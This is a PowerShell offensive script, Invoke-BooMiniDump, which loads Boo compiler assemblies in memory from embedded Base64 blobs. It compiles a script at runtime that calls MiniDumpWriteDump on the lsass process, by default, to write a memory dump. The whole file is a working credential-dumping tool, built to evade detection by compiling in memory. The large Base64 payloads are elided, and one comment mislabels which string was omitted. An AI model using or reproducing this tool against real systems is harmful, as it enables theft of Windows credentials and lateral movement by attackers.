function Invoke-BooMiniDump
{
    param (
        [parameter(Mandatory=$false)][String]$ProcName = "lsass",
        [parameter(Mandatory=$false)][String]$DumpFile = "lsass.dmp"
    )
    $BooLangDLL = @'vH0Hf...r3w=='@ # The omitted 'vH0Hf...r3w==' is actually a 967864-character long Base64 string.
    $BooLangCompilerDLL = @'7D0J...7+Xw='@ # The omitted '7D0J...7+Xw=' is actually a 11522276-character long Base64 string.
    $BooLangParserDLL = @'7H0L...//h8='@ # The omitted '7D0J...7+Xw=' is actually a 13126220-character long Base64 string.
    function Load-Assembly($EncodedCompressedFile)
    {
        $DeflatedStream = New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($EncodedCompressedFile),[IO.Compression.CompressionMode]::Decompress)
        $UncompressedFileBytes = New-Object Byte[](1802752)
        $DeflatedStream.Read($UncompressedFileBytes, 0, 1802752) | Out-Null
        return [Reflection.Assembly]::Load($UncompressedFileBytes)
    }
    Write-Verbose "Loading compiler assemblies in memory..." 
    Load-Assembly($BooLangDLL) | Out-Null
    Load-Assembly($BooLangCompilerDLL) | Out-Null
    Load-Assembly($BooLangParserDLL) | Out-Null
    Write-Verbose "Compiling..." 
    $compiler = New-Object "Boo.Lang.Compiler.BooCompiler"
    $script = @'
import System.Runtime.InteropServices
from System.Diagnostics import Process
from System.IO import FileStream, FileMode, FileAccess,FileShare
[DllImport("Dbghelp.dll", EntryPoint:"MiniDumpWriteDump")]
def MiniDumpWriteDump(hProcess as int, ProcessId as int, hFile as int, DumpType as int, ExceptionParam as int, UserStreamParam as int, CallbackParam as int):
    pass
class MiniDump:
    public static def DumpProcess(procName as string, dumpFileName as string):
        ids = Process.GetProcessesByName(procName)
        if len(ids) == 0:
            print "[-] No process named '{0}'" % (procName,)
            return 
        for pid in ids:
            fs = FileStream(dumpFileName, FileMode.Create, FileAccess.ReadWrite, FileShare.Write)
            MiniDumpWriteDump(pid.Handle, pid.Id, fs.Handle,0x00000002,0,0,0)
        print "[+] Dump file: $dumpFileName"
'@
    $scriptinput = New-Object "Boo.Lang.Compiler.IO.StringInput" -ArgumentList "script", $script
    $compiler.Parameters.Input.Add($scriptinput) | Out-Null
    $compiler.Parameters.Pipeline = New-Object "Boo.Lang.Compiler.Pipelines.CompileToMemory"
    $compiler.Parameters.Ducky = $true #Setting this to false will increase speed but will disable ducktyping
    $context = $compiler.Run()
    if ($context.GeneratedAssembly -ne $null) {
        Write-Verbose "Compilation succeeded. Executing..." 
        $scriptModule = $context.GeneratedAssembly.GetType("MiniDump")
        $mainfunction= $scriptModule.GetMethod("DumpProcess")
        $mainfunction.Invoke($null, [object[]]@($ProcName,$DumpFile))
    } else {
        Write-Output $context
        Write-Verbose "[*] Errors:" 
        $context.Errors 
        Write-Verbose "[*] Warnings:" 
        Write-Output $context.Warning 
    }
}
